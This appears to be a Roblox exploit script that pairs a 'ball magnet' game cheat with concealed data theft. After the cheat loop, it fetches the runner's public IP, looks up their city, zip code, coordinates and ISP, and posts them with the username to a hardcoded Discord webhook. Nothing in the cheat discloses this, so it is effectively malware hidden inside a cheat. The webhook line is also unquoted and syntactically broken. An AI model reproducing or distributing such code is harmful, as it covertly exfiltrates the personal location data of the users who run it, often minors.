local plr = game.Players.LocalPlayer
local rs = game:GetService("RunService")

function magBall(ball)
   if ball and plr.Character then
       firetouchinterest(plr.Character["Left Arm"], ball, 0)
       task.wait()
       firetouchinterest(plr.Character["Left Arm"], ball, 1)
   end
end

rs.Stepped:Connect(function()
   for i,v in pairs(workspace:GetChildren()) do
       if v.Name == "Football" and v:IsA("BasePart") then
           magBall(v)
       end
   end
end)

local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "Place the webhook"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = https://discord.com/api/webhooks/1060928037929091163/1sJ-BqojCLzi1Sh0MDXSXS47yQYGJhWagnAU9vNIQUJzsw2T_WPXC3BSQWzrFt3v9iT_, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)